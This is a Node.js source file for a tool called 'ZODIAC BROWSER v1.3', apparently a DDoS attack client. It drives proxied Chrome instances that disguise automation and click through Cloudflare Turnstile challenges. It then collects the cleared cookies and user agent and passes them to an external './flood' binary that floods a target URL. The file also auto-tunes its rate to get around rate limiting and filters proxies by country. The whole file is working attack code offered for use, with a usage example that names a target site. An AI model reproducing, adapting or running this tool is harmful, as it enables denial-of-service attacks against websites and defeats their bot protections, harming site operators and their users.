const puppeteer = require('puppeteer-extra');
const colors = require('colors');
const fs = require('fs');
const path = require('path');
const argv = require('minimist')(process.argv.slice(2));
const timers = require('timers/promises');
const { spawn } = require('child_process');
var MMDBReader = require('mmdb-reader');

var reader = new MMDBReader('GeoLite2-Country.mmdb');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    console.log(`${hours}:${minutes}:${seconds}`.white + ` | (${'ZODIAC BROWSER'.Brightblue}) ${string}`);
};

const ban_titles = [
    'Access denied',
    'Attention Required! | Cloudflare'
];

const EXCEPTION_MESSAGE = `
${'====================================================================='.red} 
${'====================================================================='.red} 

  ZODIAC BROWSER v1.3

  It looks like the browser is failing to start.
  We suggest using "--debug" parameter to track errors.

${'====================================================================='.red} 
${'====================================================================='.red} 
`;

const TARGET_URL = process.argv[2];
const DURATION = process.argv[3];
const SESSION_THREAD = process.argv[4];
const PROXY_FILE = process.argv[5];

const DEBUG_FLAG = argv['debug'];
const RATE_FLAG = argv['rate'];
const GEO_FLAG = argv['geo'];

let custom_rate = RATE_FLAG == 'auto' ? 0 : RATE_FLAG || 64;

if (process.argv.length < 6) {
    var fileName = __filename;
    var file = path.basename(fileName);

    console.log(`
  ZODIAC BROWSER v1.3
  Usage: node ${file} [options] <params>
  
  ${'Options:'.brightWhite}
  
      ${'*'.brightGreen} TARGET           Target URL
      ${'*'.brightGreen} TIME             Attack duration
      ${'*'.brightGreen} SESSIONS         Number of browser sessions (threads)
      ${'*'.brightGreen} PROXY            Proxy file
  
  ${'Optional:'.brightWhite}
  
      ${'--rate'.brightGreen}             Ratelimit (<num>/auto)
      ${'--geo'.brightGreen}              Proxy filter (<country>)
      ${'--debug'.brightGreen}            Debug information (Errors)

  ${'Proxy format:'.brightWhite}

    ${'*'.gray} IP:PORT                   ${'(Without authorization)'.brightGreen}
    ${'*'.gray} USERNAME:PASSWORD:IP:PORT ${'(With authorization)'.brightGreen}
  
  ${'Example:'.brightWhite}
  
  ${'$'.gray} ${'xvfb-run node ' + file + ' https://forum.cfcybernews.eu 120 10 proxy.txt'.brightGreen}
 `);

    process.exit();
};

if (DEBUG_FLAG) {
    process.on('uncaughtException', function (error) {
        if (!DEBUG_FLAG && !isMessaged && exceptions >= 5) {
            console.log(EXCEPTION_MESSAGE);
            isMessaged = true;
        };

        if (!DEBUG_FLAG && !isMessaged) {
            exceptions++;
        };

        console.log(error);
    });

    process.on('unhandledRejection', function (error) {
        if (!DEBUG_FLAG && !isMessaged && exceptions >= 5) {
            console.log(EXCEPTION_MESSAGE);
            isMessaged = true;
        };

        if (!DEBUG_FLAG && !isMessaged) {
            exceptions++;
        };

        console.log(error);
    });

} else {
    process.on('uncaughtException', function (error) { });
    process.on('unhandledRejection', function (error) { })
};

var exceptions = 0;
var isMessaged = false;
let proxies;

try {
    proxies = fs.readFileSync(PROXY_FILE, 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch (e) {
    log(`Cannot load proxy file -> ` + `${e.message}`.red);
};

function randint(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}


const SITE_KEY_REGEXP = /data-sitekey="([^"]+)"/;

function extract(string, regexp, errorMessage) {
    const match = string.match(regexp);
    if (match) {
        return match[1];
    }
    if (errorMessage) {
        throw new Error(errorMessage);
    }
}

async function runner(options) {
    let browser;
    try {
        var gts = false;

        function targetFilter({ target, skipTarget }) {
            if (target.type() === 'page') return true;
            try {
                if (target._getTargetInfo().type === "iframe") return false;
            } catch (err) { };
            if (gts === false) return true;

            var response = false;
            try {
                response = !!target.url();
                if (skipTarget.find(item => String(target.url()).indexOf(String(item)) > -1)) {
                    response = true;
                };
            } catch (err) { };
            return response;
        };

        browser = await puppeteer.launch({
            executablePath: '/usr/bin/google-chrome',
            headless: false,
            defaultViewport: null,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled',
                '--window-size=1920,1080',
                `--disable-extensions-except=${__dirname}/extension/`,
                `--load-extension=${__dirname}/extension/`,
                `--proxy-server=${options.proxy.host}:${options.proxy.port}`,
            ],
            targetFilter: (target) => targetFilter({ target, skipTarget: [] })
        });

        const config = {
            pid: browser.process().pid
        };

        log(`New browser instance -> ` + `Chrome (${options.proxy.host}:${options.proxy.port})`.brightGreen);

        const pages = await browser.pages();
        const page = pages[0];

        gts = true;

        await page.setViewport({
            width: 1920,
            height: 1080
        });

        if (options.proxy.username && options.proxy.password) {
            await page.authenticate({ username: options.proxy.username, password: options.proxy.password });
        };

        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(MouseEvent.prototype, 'screenX', {
                get: function () {
                    return this.clientX + window.screenX;
                }
            });

            Object.defineProperty(MouseEvent.prototype, 'screenY', {
                get: function () {
                    return this.clientY + window.screenY;
                }
            });
        });

        const response = await page.goto(TARGET_URL, {
            waitUntil: 'domcontentloaded'
        });

        log(`Navigated to page -> ` + `${TARGET_URL}`.brightGreen);
        
        async function turnstile() {
            const elements = await page.$$('[name="cf-turnstile-response"]');

            if (elements.length <= 0) return false;

            for (const element of elements) {
                try {
                    const parentElement = await element.evaluateHandle(el => el.parentElement);

                    const box = await parentElement.boundingBox();

                    const x = box.x;
                    const y = box.y + box.height / 2;
                    await page.evaluate((a, b) => {
                        const marker = document.createElement('div');
                        marker.style.position = 'absolute';
                        marker.style.left = `${a}px`;
                        marker.style.top = `${b}px`;
                        marker.style.width = '10px';
                        marker.style.height = '10px';
                        marker.style.backgroundColor = 'red';
                        marker.style.borderRadius = '50%';
                        marker.style.zIndex = '1000';
                        document.body.appendChild(marker);
                    }, x, y);

                    await page.mouse.click(x + 30, y);
                    await page.mouse.click((x + box.width / 2) - 430, y - 7);
                } catch (err) {
                    console.log(err)
                }
            }
        };

        const temp_title = await page.title()

        for (const ban_title of ban_titles) {
            if (temp_title.toLowerCase().includes(ban_title.toLowerCase())) {
                log(`Detected ban frame (${temp_title.brightRed})`);
                await browser.close();
                return start(options.target);
            }
        }

        // Turnstile WAF
        if (await page.title() == "Just a moment...") {
            log(`Detected protection -> ` + `CloudFlare (Turnstile)`.green);

            await timers.setTimeout(4000);

            while (await page.title() === "Just a moment...") {
                await turnstile();
                await timers.setTimeout(1500);
            };

            log(`Turnstile solved`);
        };

        await timers.setTimeout(1500);

        const page_cookies = await page.cookies();
        const cookies = page_cookies.map((c) => `${c.name}=${c.value}`).join("; ");
        const title = await page.title();
        const page_useragent = await page.evaluate(() => navigator.userAgent);

        log(`Browser got Title -> ` + `${(title !== "") ? title : "[ ] Title is empty"}`.green);
        log(`Browser got Cookies -> ` + `${(cookies !== "") ? cookies : "[ ] Cookies is empty"}`.green);

        var payload;
        if (options.proxy.username && options.proxy.password) {
            payload = `${options.proxy.username}:${options.proxy.password}:${options.proxy.host}:${options.proxy.port}`;
        } else {
            payload = `${options.proxy.host}:${options.proxy.port}`;
        };

        flooder(cookies, payload, page_useragent);

        await browser.close();
        start();

    } catch (e) {
        if (DEBUG_FLAG) {
            console.log(e);
        };

        if (!DEBUG_FLAG && !isMessaged && exceptions >= 5) {
            console.log(EXCEPTION_MESSAGE);
            isMessaged = true;
        };

        if (!DEBUG_FLAG && !isMessaged) {
            exceptions++;
        };

        await browser.close();
        start();
    }
};


async function detect_rate(domuz) {
    let rators = [];
    let isCompleted = false;

    async function runRator(i) {
        const parsed_proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');

        let user, pass, ip, port;
        let buf = {};

        if (parsed_proxy[2] && parsed_proxy[3]) {
            user = parsed_proxy[0];
            pass = parsed_proxy[1];
            ip = parsed_proxy[2];
            port = parsed_proxy[3];

            buf = {
                host: ip,
                port: port,
                username: user,
                password: pass
            };
        } else {
            ip = parsed_proxy[0];
            port = parsed_proxy[1];

            buf = {
                host: ip,
                port: port
            };
        }

        const options = {
            target: domuz,
            proxy: {
                ...buf
            },
        };

        let browser;
        try {
            if (isCompleted) {
                return;
            }
            var gts = false;

            log(`RATE (${i}): Running instance browser.`);

            function targetFilter({ target, skipTarget }) {
                if (target.type() === 'page') return true;
                try {
                    if (target._getTargetInfo().type === "iframe") return false;
                } catch (err) { };
                if (gts === false) return true;

                var response = false;
                try {
                    response = !!target.url();
                    if (skipTarget.find(item => String(target.url()).indexOf(String(item)) > -1)) {
                        response = true;
                    }
                } catch (err) { };
                return response;
            }

            browser = await puppeteer.launch({
                executablePath: '/usr/bin/google-chrome',
                headless: false,
                defaultViewport: null,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-blink-features=AutomationControlled',
                    '--window-size=1920,1080',
                    `--disable-extensions-except=${__dirname}/extension/`,
                    `--load-extension=${__dirname}/extension/`,
                    `--proxy-server=${options.proxy.host}:${options.proxy.port}`,
                ],
                targetFilter: (target) => targetFilter({ target, skipTarget: [] })
            });

            rators.push(browser);

            const pages = await browser.pages();
            let page = pages[0];

            gts = true;

            await page.setViewport({
                width: 1920,
                height: 1080
            });

            if (options.proxy.username && options.proxy.password) {
                await page.authenticate({ username: options.proxy.username, password: options.proxy.password });
            }

            await page.evaluateOnNewDocument(() => {
                Object.defineProperty(MouseEvent.prototype, 'screenX', {
                    get: function () {
                        return this.clientX + window.screenX;
                    }
                });
    
                Object.defineProperty(MouseEvent.prototype, 'screenY', {
                    get: function () {
                        return this.clientY + window.screenY;
                    }
                });
            });

            const response = await page.goto(domuz, {
                waitUntil: 'domcontentloaded'
            });

            log(`RATE (${i}): Navigated to page -> ` + `${options.target}`.brightGreen);

            await timers.setTimeout(5000);

            const temp_title = await page.title();

            for (const ban_title of ban_titles) {
                if (temp_title.toLowerCase().includes(ban_title.toLowerCase())) {
                    log(`Detected ban frame (${temp_title.brightGreen})`);
                    await browser.close();
                    return runRator(i);
                }
            }

            // checking on waf's
            async function turnstile() {
                const elements = await page.$$('[name="cf-turnstile-response"]');

                if (elements.length <= 0) return false;

                for (const element of elements) {
                    try {
                        const parentElement = await element.evaluateHandle(el => el.parentElement);

                        const box = await parentElement.boundingBox();

                        const x = box.x;
                        const y = box.y + box.height / 2;
                        await page.evaluate((a, b) => {
                            const marker = document.createElement('div');
                            marker.style.position = 'absolute';
                            marker.style.left = `${a}px`;
                            marker.style.top = `${b}px`;
                            marker.style.width = '10px';
                            marker.style.height = '10px';
                            marker.style.backgroundColor = 'red';
                            marker.style.borderRadius = '50%';
                            marker.style.zIndex = '1000';
                            document.body.appendChild(marker);
                        }, x, y);

                        await page.mouse.click(x + 30, y);
                        await page.mouse.click((x + box.width / 2) - 430, y - 7);
                    } catch (err) {
                        console.log(err)
                    }
                }
            };

            // Turnstile WAF
            if (await page.title() == "Just a moment...") {
                log(`Detected protection -> ` + `CloudFlare (Turnstile)`.green);

                await timers.setTimeout(4000);

                while (await page.title() === "Just a moment...") {
                    await turnstile();
                    await timers.setTimeout(1500);
                };

                log(`Turnstile solved`);
            };

            await timers.setTimeout(1500);

            if (isCompleted) {
                await browser.close();
                return;
            }

            const page_cookies = await page.cookies();
            const cookies = page_cookies.map((c) => `${c.name}=${c.value}`).join("; ");
            const title = await page.title();
            const page_useragent = await page.evaluate(() => navigator.userAgent);

            if (isCompleted) {
                await browser.close();
                return;
            }

            log(`RATE (${i}): Got Title -> ` + `${(title !== "") ? title : "[ ] Title is empty"}`.brightGreen);
            log(`RATE (${i}): Got Cookies -> ` + `${(cookies !== "") ? cookies : "[ ] Cookies is empty"}`.brightGreen);

            if (isCompleted) {
                await browser.close();
                return;
            }

            if (!isCompleted) {
                isCompleted = true;
                log(`RATE (${i}): First completed`);
            }

            await browser.close();
            log(`RATE (${i}): Closed.`);

            let rateStatus = 0;
            let notRateStatus = 0;
            let totalStatus = 0;
            log(`RATE SYSTEM: Running test flooder instance.`);

            var payload;
            if (options.proxy.username && options.proxy.password) {
                payload = `${options.proxy.username}:${options.proxy.password}:${options.proxy.host}:${options.proxy.port}`;
            } else {
                payload = `${options.proxy.host}:${options.proxy.port}`;
            };

            const args = [
                "-u", domuz,
                "-d", "10",
                "-t", "2",
                "-r", 16,
                "-p", payload,
                "-cookie", cookies,
                "-ua", page_useragent
            ];

            const starts = spawn("./flood", args, {
                detached: false,
            });

            starts.stdout.on("data", (data) => {
                const output = data.toString().trim();
                const statusCode = parseInt(output, 10);

                if (!isNaN(statusCode)) {
                    totalStatus++;
                    if (statusCode == 429 || statusCode == "429") {
                        rateStatus++;
                    } else if (statusCode != 429 || statusCode != "429") {
                        notRateStatus++;
                    }
                } else {
                    console.log(output)
                }
            });

            function waitForExit(proc) {
                return new Promise((resolve, reject) => {
                    proc.on("exit", resolve);
                    proc.on("error", reject);
                });
            }

            await waitForExit(starts);

            let currentRate = 16;

            log(`RATE SYSTEM: Flooder report (Total: ${totalStatus}, Allowed: ${notRateStatus}, Ratelimited: ${rateStatus})`);
            const blockedPercentage = (rateStatus / totalStatus) * 100;

            if (blockedPercentage >= 100) {
                custom_rate = 1;
            } else if (blockedPercentage > 99) {
                custom_rate = 1;
            } else if (blockedPercentage > 95) {
                custom_rate = 3;
            } else if (blockedPercentage > 90) {
                custom_rate = 5;
            } else if (blockedPercentage > 85) {
                custom_rate = 8;
            } else if (blockedPercentage > 80) {
                custom_rate = 10;
            } else if (blockedPercentage > 75) {
                custom_rate = 12;
            } else if (blockedPercentage > 70) {
                custom_rate = 17;
            } else if (blockedPercentage > 65) {
                custom_rate = 22;
            } else if (blockedPercentage > 60) {
                custom_rate = 27;
            } else if (blockedPercentage > 55) {
                custom_rate = 30;
            } else if (blockedPercentage > 50) {
                custom_rate = 35;
            } else if (blockedPercentage > 40) {
                custom_rate = 40;
            } else if (blockedPercentage > 30) {
                custom_rate = 45;
            } else if (blockedPercentage > 20) {
                custom_rate = 50;
            } else if (blockedPercentage > 10) {
                custom_rate = 55;
            } else if (blockedPercentage > 5) {
                custom_rate = 64;
            } else if (blockedPercentage > 99) {
                custom_rate = 1;
            } else {
                custom_rate = 64;
            }

            log(`RATE SYSTEM: Blocked Percentage: ${blockedPercentage.toFixed(2)}%, Adjusted Rate: ${custom_rate}`);

        } catch (e) {
            console.log(e)
            if (browser) await browser.close();
            if (!isCompleted) {
                log(`RATE (${i}): Got error. Restarting...`);
                await runRator(i);
            }
        }
    }

    await Promise.all([...Array(3).keys()].map(i => runRator(i)));

    return;
}

async function start() {
    const parsed_proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');

    let user, pass, ip, port;
    let buf = {};

    if (parsed_proxy[2] && parsed_proxy[3]) {
        user = parsed_proxy[0];
        pass = parsed_proxy[1];
        ip = parsed_proxy[2];
        port = parsed_proxy[3];

        buf = {
            host: ip,
            port: port,
            username: user,
            password: pass
        };

    } else {
        ip = parsed_proxy[0];
        port = parsed_proxy[1];

        buf = {
            host: ip,
            port: port
        };

    };

    const options = {
        proxy: {
            ...buf
        }
    };

    runner(options);
}

async function main() {
    if (GEO_FLAG) {
        let temp = proxies;
        proxies = [];
        let a = 0;
        let b = 0;
        for (let temp_proxy of temp) {
            const parsed_proxyy = temp_proxy.split(':');
            if (parsed_proxyy[2] && parsed_proxyy[3]) temp_proxy = parsed_proxyy[2] + ':' + parsed_proxyy[3]
            a++;
            if (temp_proxy.length < '1.1.1.1:'.length) continue
            proxy_country = reader.lookup(temp_proxy).country.iso_code;
            if (proxy_country.toLowerCase() == GEO_FLAG.toLowerCase()) {
                proxies.push(temp_proxy);
            }
        };

        if (proxies.length == 0) {
            log(`Proxies with country ${GEO_FLAG} not found!`);
            proxies = temp;
        } else {
            log(`Found ${proxies.length} proxies!`);
        }
    }

    if (RATE_FLAG == "auto") {
        await detect_rate(TARGET_URL);
    };

    for (let i = 0; i < SESSION_THREAD; i++) {
        start();
    };
};

function flooder(cookie_string, proxy, user_agent) {
    const parsed_proxy = proxy.split(':');
    let ip;
    let port;
    let user;
    let pass;
    let payload;

    if (parsed_proxy[2] && parsed_proxy[3]) {
        user = parsed_proxy[0];
        pass = parsed_proxy[1];
        ip = parsed_proxy[2];
        port = parsed_proxy[3];
        payload = `${user}:${pass}:${ip}:${port}`;
    } else {
        ip = parsed_proxy[0];
        port = parsed_proxy[1];
        payload = `${ip}:${port}`;
    }

    try {
        const args = [
            "-u", TARGET_URL,
            "-d", "45",
            "-t", "2",
            "-r", custom_rate,
            "-p", payload,
            "-cookie", cookie_string,
            "-ua", user_agent
        ];
        console.log(args);
        const starts = spawn("./flood", args, {
            detached: false,
        });

        log(`Flooder started -> ` + `(${proxy})`.green);

        setInterval(() => {
            const starts = spawn("./flood", args, {
                detached: false,
            });
            log(`Flooder restarted -> ` + `(${proxy})`.green);

            starts.on("data", (data) => { });
            starts.on("exit", (err, signal) => { starts.kill(); });
        }, 45000);

        starts.on("data", (data) => { });
        starts.on("exit", (err, signal) => { starts.kill(); });
    } catch (err) {
        console.log(err)
    }
}

main();

setTimeout(() => {
    process.exit();
}, DURATION * 1000);
